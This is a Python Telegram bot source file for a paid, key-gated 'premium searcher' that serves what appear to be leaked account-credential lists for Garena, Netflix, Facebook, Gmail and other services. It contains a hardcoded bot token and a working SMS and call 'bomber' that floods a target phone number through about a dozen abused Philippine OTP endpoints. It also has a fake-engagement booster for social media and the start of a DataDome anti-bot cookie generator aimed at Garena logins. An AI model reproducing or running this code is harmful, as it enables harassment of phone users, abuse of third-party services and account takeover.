import os
import random
import json
import datetime
import asyncio
import re
import time
import string
from pathlib import Path
import logging
from typing import Dict, List, Optional, Tuple

import zlib
import gzip
import lzma
import base64
import marshal
import hashlib
import urllib.parse

from Crypto.Cipher import AES
from colorama import init, Fore, Back, Style

from telegram import Update, InputFile, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove, Message, Chat
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    CallbackContext,
    MessageHandler,
    filters,
    ConversationHandler
)
from telegram.error import BadRequest

import requests
from fake_useragent import UserAgent
import concurrent.futures
import threading
import aiohttp

init(autoreset=True)

TOKEN = os.environ.get("BOT_TOKEN", "8329461842:AAFQD2E5EnvmKASJDVNiguwIrq_Cs86EmQ0")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "7049142115"))
KEY_PREFIX = "ᴋʜᴀᴛᴇʟʏɴᴘʀᴇᴍɪᴜᴍᴋᴇʏ-"

ACCESS_FILE = "access.json"
KEYS_FILE = "keys.json"
USER_DROPS_DIR = Path("userdrops")
LOGS_DIR = Path("logs")
GENERATED_DIR = Path("generated")

for directory in [USER_DROPS_DIR, LOGS_DIR, GENERATED_DIR]:
    directory.mkdir(parents=True, exist_ok=True)

DATABASE_FILES = {
    "100054 (ɢᴀʀᴇɴᴀ)": "100054.txt", 
    "100055 (ɢᴀʀᴇɴᴀ)": "100055.txt", 
    "100072 (ɢᴀʀᴇɴᴀ)": "100072.txt",
    "100080 (ɢᴀʀᴇɴᴀ)": "100080.txt", 
    "100082 (ɢᴀʀᴇɴᴀ)": "100082.txt",
    "PRIVATE (ɢᴀʀᴇɴᴀ)": "private.txt",
    "AUTHGOP (ɢᴀʀᴇɴᴀ)": "authgop.txt", 
    "GARENA": "garena.txt", 
    "GASLITE": "gaslite.txt",     
    "SSO GARENA": "sso_garena.txt",
    "SSO REGISTER": "sso_register.txt",
    "SSO UNIVERSAL": "sso_universal.txt",
    "UNIVERSAL": "universal.txt",
    "PORNHUB": "pornhub.txt", 
    "NETFLIX": "netflix.txt", 
    "FACEBOOK": "facebook.txt",
    "TIKTOK": "tiktok.txt",
    "CRUNCHYROLL": "crunchyroll.txt",
    "CODASHOP": "codashop.txt",
    "MLBB": "mtaccmobilelegends.com.txt", 
    "ROBLOX": "roblox.txt", 
    "INSTAGRAM": "instagram.txt",
    "GENSHIN": "genshin.txt", 
    "SPOTIFY": "spotify.txt",
    "BILIBILI": "bilibili.txt",
    "VIVAMAX": "vivamax.txt",
    "VALORANT": "valorant.txt",
    "TELEGRAM": "tg.txt",
    "TWITTER": "twitter.txt",
    "ONLYFANS": "onlyfans.txt",
    "GMAIL": "gmail.txt", 
    "HOTMAIL": "hotmail.txt",
    "ONSTOVE": "onstove.txt",
    "GAMECLUB": "gameclub.txt", 
    
       
}

USER_ACCESS = {}
USER_STATS = {}
ACCESS_KEYS = {}
USED_KEYS = set()

AWAITING_KEY_INPUT = set()
AWAITING_REVOKE_USER = set()
AWAITING_ANNOUNCEMENT = set()
AWAITING_KEY_DURATION = set()
AWAITING_DELETE_KEY = set()
AWAITING_FEEDBACK = set()
AWAITING_KEY_COUNT = set()
AWAITING_FILE_UPLOAD = set()

MAINTENANCE_MODE = False

USER_ROLES = {}
AWAITING_ROLE_USER_ID = set()
AWAITING_ROLE_SELECTION = {}

BOT_DISPLAY_NAME = "ᴋʜᴀᴛᴇʟʏɴ ᴘʀᴇᴍɪᴜᴍ sᴇᴀʀᴄʜᴇʀ"
BOT_STATUS_MESSAGE = "ᴏɴʟɪɴᴇ ᴀɴᴅ ʀᴇᴀᴅʏ ᴛᴏ ᴜsᴇ 🙂"

# To:
AES_KEY = os.environ.get("AES_KEY", "Ashkupal0829").encode()

# SMS Bomber States
AWAITING_BOMBER_PHONE = set()
AWAITING_BOMBER_AMOUNT = set()
AWAITING_BOMBER_SENDER = set()
AWAITING_BOMBER_MESSAGE = set()
BOMBER_ACTIVE_ATTACKS = {}

# Social Media Booster States
BOOSTER_ACTIVE = set()
AWAITING_BOOST_URL = set()

# ========== SMS BOMBER CLASS ==========
class SMSBomber:
    def __init__(self, user_id: int):
        self.user_id = user_id
        self.success_count = 0
        self.fail_count = 0
        self.custom_sender_name = "User"
        self.custom_message = "Test Message"
        self.is_running = False
        self.current_batch = 0
        self.total_batches = 0
        
    def normalize_phone_number(self, phone: str) -> str:
        """Normalize Philippine phone numbers"""
        phone = phone.replace(' ', '')
        
        if phone.startswith('0'):
            return '+63' + phone[1:]
        elif phone.startswith('63') and not phone.startswith('+63'):
            return '+' + phone
        elif not phone.startswith('+63') and len(phone) == 10:
            return '+63' + phone
        elif not phone.startswith('+'):
            return '+63' + phone
        
        return phone
    
    def random_string(self, length: int) -> str:
        chars = string.ascii_lowercase + string.digits
        return ''.join(random.choice(chars) for _ in range(length))
    
    def random_gmail(self) -> str:
        return f"{self.random_string(8)}@gmail.com"
    
    def random_uid(self) -> str:
        return self.random_string(28)
    
    def random_device_id(self) -> str:
        return self.random_string(16)
    
    async def send_custom_sms(self, number_to_send: str) -> bool:
        """Send custom SMS using the m2techtronix service"""
        try:
            normalized_number = self.normalize_phone_number(number_to_send)
            
            if not normalized_number:
                return False

            suffix = '-freed0m'
            credits = '\n\n𝑪𝒓𝒆𝒂𝒕𝒆𝒅 𝑩𝒚 𝑲𝒉𝒂𝒕𝒆𝒍𝒚𝒏'
            if self.custom_message.endswith(suffix):
                with_suffix = self.custom_message
            else:
                with_suffix = f"{self.custom_message} {suffix}"
            final_text = f"{with_suffix}{credits}"

            command_array = [
                'free.text.sms',
                '421',
                normalized_number,
                '2207117BPG',
                'fuT8-dobSdyEFRuwiHrxiz:APA91bHNbeMP4HxJR-eBEAS0lf9fyBPg-HWWd21A9davPtqxmU-J-TTQWf28KXsWnnTnEAoriWq3TFG8Xdcp83C6GrwGka4sTd_6qnlqbfN4gP82YaTgvvg',
                final_text
            ]

            headers = {
                'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 15; 2207117BPG Build/AP3A.240905.015.A2)',
                'Connection': 'Keep-Alive',
                'Content-Type': 'application/x-www-form-urlencoded'
            }

            data = {
                'UID': self.random_uid(),
                'humottaee': 'Processing',
                'Email': self.random_gmail(),
                '$Oj0O%K7zi2j18E': json.dumps(command_array),
                'device_id': self.random_device_id(),
                'Photo': 'https://lh3.googleusercontent.com/a/ACg8ocJyIdNL-vWOcm_v4Enq2PRZRcNaU_c8Xt0DJ1LNvmtKDiVQ-A=s96-c',
                'Name': self.custom_sender_name
            }

            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
                async with session.post(
                    'https://sms.m2techtronix.com/v13/sms.php',
                    data=urllib.parse.urlencode(data),
                    headers=headers
                ) as response:
                    return response.status == 200
        except Exception as e:
            logging.error(f"SMS Bomber - Custom SMS error: {e}")
            return False
    
    async def send_ezloan(self, number_to_send: str) -> bool:
        try:
            headers = {
                'User-Agent': 'okhttp/4.9.2',
                'Accept': 'application/json',
                'Content-Type': 'application/json',
            }
            
            data = {
                "businessId": "EZLOAN",
                "contactNumber": number_to_send,
                "appsflyerIdentifier": "1760444943092-3966994042140191452"
            }
            
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
                async with session.post(
                    'https://gateway.ezloancash.ph/security/auth/otp/request',
                    headers=headers,
                    json=data
                ) as response:
                    return response.status == 200
        except Exception as e:
            logging.error(f"SMS Bomber - EZLOAN error: {e}")
            return False
    
    async def send_xpress(self, number_to_send: str, batch_num: int) -> bool:
        try:
            formatted_num = self.normalize_phone_number(number_to_send)
            data = {
                "FirstName": "user",
                "LastName": "test",
                "Email": f"user{int(time.time() * 1000)}_{batch_num}@gmail.com",
                "Phone": formatted_num,
                "Password": "Pass1234",
                "ConfirmPassword": "Pass1234",
                "FingerprintVisitorId": "TPt0yCuOFim3N3rzvrL1",
                "FingerprintRequestId": "1757149666261.Rr1VvG",
            }
            
            headers = {
                "User-Agent": "Dalvik/2.1.0",
                "Content-Type": "application/json",
            }
            
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as session:
                async with session.post(
                    "https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp",
                    headers=headers,
                    json=data
                ) as response:
                    return response.status == 200
        except Exception as e:
            logging.error(f"SMS Bomber - XPRESS error: {e}")
            return False
    
    async def send_abenson(self, number_to_send: str) -> bool:
        try:
            data = {
                "contact_no": number_to_send,
                "login_token": "undefined"
            }
            
            headers = {
                'User-Agent': 'okhttp/4.9.0',
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as session:
                async with session.post(
                    'https://api.mobile.abenson.com/api/public/membership/activate_otp',
                    headers=headers,
                    data=data
                ) as response:
                    return response.status == 200
        except Exception as e:
            logging.error(f"SMS Bomber - ABENSON error: {e}")
            return False
    
    async def send_excellent_lending(self, number_to_send: str) -> bool:
        try:
            coordinates = [
                {"lat": "14.5995", "long": "120.9842"},
                {"lat": "14.6760", "long": "121.0437"},
                {"lat": "14.8648", "long": "121.0418"}
            ]
            user_agents = [
                'okhttp/4.12.0',
                'okhttp/4.9.2',
                'Dart/3.6 (dart:io)',
            ]
            
            coord = random.choice(coordinates)
            agent = random.choice(user_agents)
            
            data = {
                "domain": number_to_send,
                "cat": "login",
                "previous": False,
                "financial": "efe35521e51f924efcad5d61d61072a9"
            }
            
            headers = {
                'User-Agent': agent,
                'Content-Type': 'application/json; charset=utf-8',
                'x-latitude': coord["lat"],
                'x-longitude': coord["long"]
            }
            
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as session:
                async with session.post(
                    'https://api.excellenteralending.com/dllin/union/rehabilitation/dock',
                    headers=headers,
                    json=data
                ) as response:
                    return response.status == 200
        except Exception as e:
            logging.error(f"SMS Bomber - EXCELLENT LENDING error: {e}")
            return False
    
    async def send_fortune_pay(self, number_to_send: str) -> bool:
        try:
            data = {
                "deviceId": "c31a9bc0-652d-11f0-88cf-9d4076456969",
                "deviceType": "GOOGLE_PLAY",
                "companyId": "4bf735e97269421a80b82359e7dc2288",
                "dialCode": "+63",
                "phoneNumber": number_to_send.replace('0', '', 1) if number_to_send.startswith('0') else number_to_send
            }
            
            headers = {
                'User-Agent': 'Dart/3.6 (dart:io)',
                'Content-Type': 'application/json',
                'app-type': 'GOOGLE_PLAY',
                'authorization': 'Bearer',
            }
            
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as session:
                async with session.post(
                    'https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register',
                    headers=headers,
                    json=data
                ) as response:
                    return response.status == 200
        except Exception as e:
            logging.error(f"SMS Bomber - FORTUNE PAY error: {e}")
            return False
    
    async def send_wemove(self, number_to_send: str) -> bool:
        try:
            data = {
                "phone_country": "+63",
                "phone_no": number_to_send.replace('0', '', 1) if number_to_send.startswith('0') else number_to_send
            }
            
            headers = {
                'User-Agent': 'okhttp/4.9.3',
                'Content-Type': 'application/json',
                'xuid_type': 'user',
                'source': 'customer',
                'authorization': 'Bearer'
            }
            
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as session:
                async with session.post(
                    'https://api.wemove.com.ph/auth/users',
                    headers=headers,
                    json=data
                ) as response:
                    return response.status == 200
        except Exception as e:
            logging.error(f"SMS Bomber - WEMOVE error: {e}")
            return False
    
    async def send_lbc(self, number_to_send: str) -> bool:
        try:
            data = {
                "verification_type": "mobile",
                "client_email": f"{self.random_string(8)}@gmail.com",
                "client_contact_code": "+63",
                "client_contact_no": number_to_send.replace('0', '', 1) if number_to_send.startswith('0') else number_to_send,
                "app_log_uid": self.random_string(16),
            }
            
            headers = {
                'User-Agent': 'Dart/2.19 (dart:io)',
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as session:
                async with session.post(
                    'https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification',
                    headers=headers,
                    data=data
                ) as response:
                    return response.status == 200
        except Exception as e:
            logging.error(f"SMS Bomber - LBC error: {e}")
            return False
    
    async def send_pickup_coffee(self, number_to_send: str) -> bool:
        try:
            user_agents = ['okhttp/4.12.0', 'okhttp/4.9.2', 'Dart/3.6 (dart:io)']
            formatted_num = self.normalize_phone_number(number_to_send)
            
            data = {
                "mobile_number": formatted_num,
                "login_method": "mobile_number"
            }
            
            headers = {
                'User-Agent': random.choice(user_agents),
                'Content-Type': 'application/json',
            }
            
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as session:
                async with session.post(
                    'https://production.api.pickup-coffee.net/v2/customers/login',
                    headers=headers,
                    json=data
                ) as response:
                    return response.status == 200
        except Exception as e:
            logging.error(f"SMS Bomber - PICKUP COFFEE error: {e}")
            return False
    
    async def send_honey_loan(self, number_to_send: str) -> bool:
        try:
            data = {
                "phone": number_to_send,
                "is_rights_block_accepted": 1
            }
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 15)',
                'Content-Type': 'application/json',
            }
            
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as session:
                async with session.post(
                    'https://api.honeyloan.ph/api/client/registration/step-one',
                    headers=headers,
                    json=data
                ) as response:
                    return response.status == 200
        except Exception as e:
            logging.error(f"SMS Bomber - HONEY LOAN error: {e}")
            return False
    
    async def send_komo_ph(self, number_to_send: str) -> bool:
        try:
            headers = {
                'Content-Type': 'application/json',
                'Signature': 'ET/C2QyGZtmcDK60Jcavw2U+rhHtiO/HpUTT4clTiISFTIshiM58ODeZwiLWqUFo51Nr5rVQjNl6Vstr82a8PA==',
                'Ocp-Apim-Subscription-Key': 'cfde6d29634f44d3b81053ffc6298cba'
            }
            
            data = {
                "mobile": number_to_send,
                "transactionType": 6
            }
            
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as session:
                async with session.post(
                    'https://api.komo.ph/api/otp/v5/generate',
                    headers=headers,
                    json=data
                ) as response:
                    return response.status == 200
        except Exception as e:
            logging.error(f"SMS Bomber - KOMO PH error: {e}")
            return False
    
    async def send_s5_otp(self, number_to_send: str) -> bool:
        try:
            normalized_phone = self.normalize_phone_number(number_to_send)
            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en',
                'content-type': 'multipart/form-data;',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
            }

            body = f"phone_number={normalized_phone}"

            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as session:
                async with session.post(
                    'https://api.s5.com/player/api/v1/otp/request',
                    headers=headers,
                    data=body
                ) as response:
                    return response.status == 200
        except Exception as e:
            logging.error(f"SMS Bomber - S5 OTP error: {e}")
            return False
    
    async def send_call_bomb(self, number_to_send: str) -> bool:
        """Call bombing service integration"""
        try:
            normalized_phone = self.normalize_phone_number(number_to_send).replace('+', '')
            
            if not normalized_phone.startswith('63'):
                return False

            headers = {'Content-Type': 'application/json'}
            data = json.dumps({"phone": f"+{normalized_phone}"})
            
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=15)) as session:
                async with session.post(
                    "https://call-bomb.onrender.com/",
                    data=data,
                    headers=headers
                ) as response:
                    if response.status == 200:
                        result = await response.json()
                        return result.get('success', False)
                    return False
        except Exception as e:
            logging.error(f"SMS Bomber - CALL BOMB error: {e}")
            return False
    
    def get_all_services(self):
        return [
            "CUSTOM_SMS", "EZLOAN", "XPRESS", "ABENSON", "EXCELLENT_LENDING",
            "FORTUNE_PAY", "WEMOVE", "LBC", "PICKUP_COFFEE", "HONEY_LOAN",
            "KOMO_PH", "S5_OTP", "CALL_BOMB"
        ]
    
    async def execute_attack(self, target_number: str, amount: int, context: CallbackContext, chat_id: int):
        """Execute the SMS bombing attack"""
        self.is_running = True
        self.success_count = 0
        self.fail_count = 0
        self.total_batches = amount
        self.current_batch = 0
        
        selected_services = self.get_all_services()
        
        # Send initial message
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                "🚀 **𝚂𝙼𝚂 𝙱𝙾𝙼𝙱𝙴𝚁 𝚂𝚃𝙰𝚁𝚃𝙴𝙳** 🚀\n\n"
                f"🎯 **𝚃𝚊𝚛𝚐𝚎𝚝**: `{target_number}`\n"
                f"📊 **𝙱𝚊𝚝𝚌𝚑𝚎𝚜**: {amount}\n"
                f"🔧 **𝚂𝚎𝚛𝚟𝚒𝚌𝚎𝚜**: {len(selected_services)}\n\n"
                "⏳ *𝚂𝚝𝚊𝚛𝚝𝚒𝚗𝚐 𝚊𝚝𝚝𝚊𝚌𝚔...*"
            ),
            parse_mode="Markdown"
        )
        
        for batch in range(1, amount + 1):
            if not self.is_running:
                break
                
            self.current_batch = batch
            
            # Update progress
            progress_msg = await context.bot.send_message(
                chat_id=chat_id,
                text=(
                    f"🔄 **𝙱𝚊𝚝𝚌𝚑 {batch}/{amount}**\n"
                    f"📤 𝚂𝚎𝚗𝚍𝚒𝚗𝚐 𝙼𝚎𝚜𝚜𝚊𝚐𝚎𝚜 𝚃𝚘 {len(selected_services)} services...\n\n"
                    f"✅ 𝚂𝚞𝚌𝚌𝚎𝚜𝚜: {self.success_count}\n"
                    f"❌ 𝙵𝚊𝚒𝚕𝚎𝚍: {self.fail_count}"
                ),
                parse_mode="Markdown"
            )
            
            tasks = []
            
            # Prepare all service tasks
            for service_name in selected_services:
                if service_name == "CUSTOM_SMS":
                    tasks.append(self.send_custom_sms(target_number))
                elif service_name == "EZLOAN":
                    tasks.append(self.send_ezloan(target_number))
                elif service_name == "XPRESS":
                    tasks.append(self.send_xpress(target_number, batch))
                elif service_name == "ABENSON":
                    tasks.append(self.send_abenson(target_number))
                elif service_name == "EXCELLENT_LENDING":
                    tasks.append(self.send_excellent_lending(target_number))
                elif service_name == "FORTUNE_PAY":
                    tasks.append(self.send_fortune_pay(target_number))
                elif service_name == "WEMOVE":
                    tasks.append(self.send_wemove(target_number))
                elif service_name == "LBC":
                    tasks.append(self.send_lbc(target_number))
                elif service_name == "PICKUP_COFFEE":
                    tasks.append(self.send_pickup_coffee(target_number))
                elif service_name == "HONEY_LOAN":
                    tasks.append(self.send_honey_loan(target_number))
                elif service_name == "KOMO_PH":
                    tasks.append(self.send_komo_ph(target_number))
                elif service_name == "S5_OTP":
                    tasks.append(self.send_s5_otp(target_number))
                elif service_name == "CALL_BOMB":
                    tasks.append(self.send_call_bomb(target_number))
            
            # Execute all tasks concurrently
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Count results
            batch_success = sum(1 for result in results if result is True)
            batch_fail = len(results) - batch_success
            
            self.success_count += batch_success
            self.fail_count += batch_fail
            
            # Update progress message
            try:
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=progress_msg.message_id,
                    text=(
                        f"✅ **𝙱𝚊𝚝𝚌𝚑 {batch}/{amount} Completed**\n\n"
                        f"📊 **𝙱𝚊𝚝𝚌𝚑 Statistics**:\n"
                        f"✓ 𝚂𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕: {batch_success}\n"
                        f"✗ 𝙵𝚊𝚒𝚕𝚎𝚍: {batch_fail}\n\n"
                        f"📈 **𝙾𝚟𝚎𝚛𝚊𝚕𝚕 𝚂𝚝𝚊𝚝𝚒𝚜𝚝𝚒𝚌𝚜**:\n"
                        f"✓ Total 𝚂𝚞𝚌𝚌𝚎𝚜𝚜: {self.success_count}\n"
                        f"✗ Total 𝙵𝚊𝚒𝚕𝚎𝚍: {self.fail_count}"
                    ),
                    parse_mode="Markdown"
                )
            except:
                pass
            
            # Delay between batches if not last batch
            if batch < amount and self.is_running:
                delay = random.randint(2, 4)
                await asyncio.sleep(delay)
        
        # Send final results
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                "🎉 **𝙰𝚃𝚃𝙰𝙲𝙺 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳** 🎉\n\n"
                f"🎯 **𝚃𝚊𝚛𝚐𝚎𝚝**: `{target_number}`\n"
                f"📊 **𝙱𝚊𝚝𝚌𝚑𝚎𝚜 𝙴𝚡𝚎𝚌𝚞𝚝𝚎𝚍**: {self.current_batch}/{amount}\n\n"
                f"✅ **𝚂𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕 𝙼𝚎𝚜𝚜𝚊𝚐𝚎𝚜**: {self.success_count}\n"
                f"❌ **𝙵𝚊𝚒𝚕𝚎𝚍 𝙼𝚎𝚜𝚜𝚊𝚐𝚎𝚜**: {self.fail_count}\n"
                f"📈 **𝚃𝚘𝚝𝚊𝚕 𝙰𝚝𝚝𝚎𝚖𝚙𝚝𝚜**: {self.success_count + self.fail_count}\n\n"
                "⚠️ *𝚄𝚜𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚜𝚒𝚋𝚕𝚢*"
            ),
            parse_mode="Markdown"
        )
        
        self.is_running = False
        return {
            "success": self.success_count,
            "failed": self.fail_count,
            "total": self.success_count + self.fail_count
        }
    
    def stop_attack(self):
        """Stop the ongoing attack"""
        self.is_running = False

# ========== SOCIAL MEDIA BOOSTER CLASS ==========
class SocialMediaBooster:
    def __init__(self):
        self.base_url = "https://zefame-free.com/api_free.php"
        self.proxy_url = "https://zefame-free.com/tiktok_proxy.php"
        self.headers = {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-US,en;q=0.9,fil;q=0.8",
            "origin": "https://zefame.com",
            "referer": "https://zefame.com/",
            "sec-ch-ua": '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"
        }
    
    def generate_device_id(self):
        """Generate a unique device ID"""
        import uuid
        return str(uuid.uuid4())
    
    def extract_video_id(self, tiktok_url):
        """Extract video ID from TikTok URL"""
        from urllib.parse import urlparse
        try:
            parsed = urlparse(tiktok_url)
            path_parts = parsed.path.split('/')
            
            for i, part in enumerate(path_parts):
                if part == 'video' and i + 1 < len(path_parts):
                    video_id = path_parts[i + 1].split('?')[0]
                    return video_id
            
            return None
        except Exception as e:
            return None
    
    def extract_username(self, tiktok_url):
        """Extract username from TikTok URL"""
        from urllib.parse import urlparse
        try:
            parsed = urlparse(tiktok_url)
            path_parts = parsed.path.split('/')
            
            for part in path_parts:
                if part.startswith('@'):
                    return part[1:]
            
            return None
        except Exception:
            return None
    
    async def check_video_id(self, tiktok_url):
        """Check if video ID is valid"""
        headers = self.headers.copy()
        headers["content-type"] = "application/x-www-form-urlencoded; charset=UTF-8"
        
        data = { "action": "checkVideoId", "link": tiktok_url }
        
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
                async with session.post(self.base_url, headers=headers, data=data) as response:
                    if response.status == 200:
                        result = await response.json()
                        if result.get('success') or result.get('status') == 'success':
                            video_id = result.get('data', {}).get('videoId') or result.get('videoId')
                            return video_id
            return None
        except Exception:
            return None
    
    async def check_username_proxy(self, username):
        """Check username via proxy"""
        params = { "username": username }
        headers = self.headers.copy()
        headers["accept"] = "*/*"
        
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
                async with session.get(self.proxy_url, headers=headers, params=params) as response:
                    if response.status == 200:
                        result = await response.json()
                        if result.get('statusCode') == 0 or result.get('status_code') == 0 or result.get('userInfo'):
                            return True
            return False
        except Exception:
            return False
    
    async def place_order(self, order_data, service_type):
        """Place a boosting order"""
        headers = self.headers.copy()
        headers["content-type"] = "application/x-www-form-urlencoded; charset=UTF-8"
        
        url = f"{self.base_url}?action=order"
        
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=15)) as session:
                async with session.post(url, headers=headers, data=order_data) as response:
                    if response.status == 200:
                        result = await response.json()
                        return result
            return None
        except Exception:
            return None
    
    async def boost_tiktok_views(self, tiktok_url):
        """Boost TikTok video views"""
        device_id = self.generate_device_id()
        
        # Step 1: Check video ID
        video_id = await self.check_video_id(tiktok_url)
        if not video_id:
            return False, "Failed to validate video ID"
        
        # Step 2: Prepare order data
        order_data = {
            "action": "order",
            "service": "229",  # TikTok Views service ID
            "link": tiktok_url,
            "uuid": device_id,
            "videoId": video_id
        }
        
        # Step 3: Place order
        result = await self.place_order(order_data, "tiktok_views")
        
        if result and result.get('success'):
            order_id = result.get('data', {}).get('orderId', 'N/A')
            return True, f"Order placed successfully! Order ID: {order_id}"
        else:
            error_msg = result.get('message', 'Unknown error') if result else 'Network error'
            return False, f"Failed to place order: {error_msg}"
    
    async def boost_tiktok_followers(self, tiktok_url):
        """Boost TikTok followers"""
        device_id = self.generate_device_id()
        
        # Step 1: Extract and check username
        username = self.extract_username(tiktok_url)
        if not username:
            return False, "Could not extract username from URL"
        
        # Step 2: Check username via proxy
        if not await self.check_username_proxy(username):
            return False, "Failed to validate username"
        
        # Step 3: Prepare order data
        order_data = {
            "service": "228",  # TikTok Followers service ID
            "link": tiktok_url,
            "uuid": device_id,
            "username": username
        }
        
        # Step 4: Place order
        result = await self.place_order(order_data, "tiktok_followers")
        
        if result and result.get('success'):
            order_id = result.get('data', {}).get('orderId', 'N/A')
            return True, f"Order placed successfully! Order ID: {order_id}"
        else:
            error_msg = result.get('message', 'Unknown error') if result else 'Network error'
            return False, f"Failed to place order: {error_msg}"
    
    async def boost_tiktok_likes(self, tiktok_url):
        """Boost TikTok likes"""
        device_id = self.generate_device_id()
        
        # Step 1: Check video ID
        video_id = await self.check_video_id(tiktok_url)
        if not video_id:
            return False, "Failed to validate video ID"
        
        # Step 2: Prepare order data
        order_data = {
            "action": "order",
            "service": "232",  # TikTok Likes service ID
            "link": tiktok_url,
            "uuid": device_id,
            "videoId": video_id
        }
        
        # Step 3: Place order
        result = await self.place_order(order_data, "tiktok_likes")
        
        if result and result.get('success'):
            order_id = result.get('data', {}).get('orderId', 'N/A')
            return True, f"Order placed successfully! Order ID: {order_id}"
        else:
            error_msg = result.get('message', 'Unknown error') if result else 'Network error'
            return False, f"Failed to place order: {error_msg}"
    
    async def boost_telegram_views(self, telegram_url):
        """Boost Telegram views"""
        device_id = self.generate_device_id()
        
        # Prepare order data
        order_data = {
            "action": "order",
            "service": "248",  # Telegram Views service ID
            "link": telegram_url,
            "uuid": device_id
        }
        
        # Place order
        result = await self.place_order(order_data, "telegram_views")
        
        if result and result.get('success'):
            order_id = result.get('data', {}).get('orderId', 'N/A')
            return True, f"Order placed successfully! Order ID: {order_id}"
        else:
            error_msg = result.get('message', 'Unknown error') if result else 'Network error'
            return False, f"Failed to place order: {error_msg}"
    
    async def boost_facebook(self, facebook_url):
        """Boost Facebook"""
        device_id = self.generate_device_id()
        
        # Prepare order data
        order_data = {
            "action": "order",
            "service": "244",  # Facebook service ID
            "link": facebook_url,
            "uuid": device_id,
            "username": "share"
        }
        
        # Place order
        result = await self.place_order(order_data, "facebook")
        
        if result and result.get('success'):
            order_id = result.get('data', {}).get('orderId', 'N/A')
            return True, f"Order placed successfully! Order ID: {order_id}"
        else:
            error_msg = result.get('message', 'Unknown error') if result else 'Network error'
            return False, f"Failed to place order: {error_msg}"
    
    async def boost_instagram_views(self, instagram_url):
        """Boost Instagram views"""
        device_id = self.generate_device_id()
        
        # Prepare order data
        order_data = {
            "action": "order",
            "service": "237",  # Instagram Views service ID
            "link": instagram_url,
            "uuid": device_id
        }
        
        # Place order
        result = await self.place_order(order_data, "instagram_views")
        
        if result and result.get('success'):
            order_id = result.get('data', {}).get('orderId', 'N/A')
            return True, f"Order placed successfully! Order ID: {order_id}"
        else:
            error_msg = result.get('message', 'Unknown error') if result else 'Network error'
            return False, f"Failed to place order: {error_msg}"
    
    async def boost_twitter_views(self, twitter_url):
        """Boost Twitter views"""
        device_id = self.generate_device_id()
        
        # Prepare order data
        order_data = {
            "action": "order",
            "service": "231",  # Twitter Views service ID
            "link": twitter_url,
            "uuid": device_id
        }
        
        # Place order
        result = await self.place_order(order_data, "twitter_views")
        
        if result and result.get('success'):
            order_id = result.get('data', {}).get('orderId', 'N/A')
            return True, f"Order placed successfully! Order ID: {order_id}"
        else:
            error_msg = result.get('message', 'Unknown error') if result else 'Network error'
            return False, f"Failed to place order: {error_msg}"
    
    async def boost_youtube_views(self, youtube_url):
        """Boost YouTube views"""
        device_id = self.generate_device_id()
        
        # Prepare order data
        order_data = {
            "action": "order",
            "service": "245",  # YouTube Views service ID
            "link": youtube_url,
            "uuid": device_id
        }
        
        # Place order
        result = await self.place_order(order_data, "youtube_views")
        
        if result and result.get('success'):
            order_id = result.get('data', {}).get('orderId', 'N/A')
            return True, f"Order placed successfully! Order ID: {order_id}"
        else:
            error_msg = result.get('message', 'Unknown error') if result else 'Network error'
            return False, f"Failed to place order: {error_msg}"

# ========== DATADOME COOKIE GENERATOR CLASS ==========
class DataDomeGenerator:
    def __init__(self):
        self.url = 'https://dd.garena.com/js/'
    
    def get_new_datadome(self):
        headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://account.garena.com',
            'pragma': 'no-cache',
            'referer': 'https://account.garena.com/',
